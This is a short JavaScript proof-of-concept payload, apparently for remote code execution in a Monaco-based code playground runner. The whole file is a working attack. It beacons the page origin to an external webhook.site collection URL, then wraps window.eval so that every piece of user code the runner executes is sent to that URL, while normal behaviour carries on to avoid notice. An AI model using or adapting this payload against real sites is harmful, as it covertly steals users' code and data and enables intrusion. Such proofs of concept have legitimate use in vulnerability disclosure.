// loader.js – PoC for remote code execution in Monaco playground runner

const EXFIL = "https://webhook.site/55ba3434-91a8-49ee-993d-42e54f4fb6a3";

(function () {
  const origin = window.location.origin;

  // 1) Proof of execution in the runner origin
  console.warn("[attacker] loader.js executed in:", origin);
  fetch(
    EXFIL +
      "?stage=loader_exec&origin=" +
      encodeURIComponent(origin) +
      "&ts=" +
      Date.now(),
    { method: "GET" }
  );

  // 2) Hook window.eval to capture user code executed by the runner
  const originalEval = window.eval;
  window.eval = function (code) {
    try {
      // Limit size to avoid over-collection in PoC
      const snippet = String(code).slice(0, 1000);

      fetch(
        EXFIL +
          "?stage=user_code&snippet=" +
          encodeURIComponent(snippet) +
          "&ts=" +
          Date.now(),
        { method: "GET" }
      );
    } catch (e) {
      console.error("[attacker] exfil failed", e);
    }

    // Call the original eval so playground behavior stays normal
    return originalEval.call(this, code);
  };

  // 3) Minimal visual marker (optional, puoi rimuoverlo se non lo vuoi)
  try {
    const banner = document.createElement("div");
    banner.textContent = "Custom loader.js active (PoC)";
    banner.style.position = "fixed";
    banner.style.bottom = "8px";
    banner.style.right = "8px";
    banner.style.background = "rgba(255, 0, 0, 0.1)";
    banner.style.color = "#900";
    banner.style.padding = "4px 8px";
    banner.style.fontSize = "12px";
    document.body.appendChild(banner);
  } catch (_) {}
})();
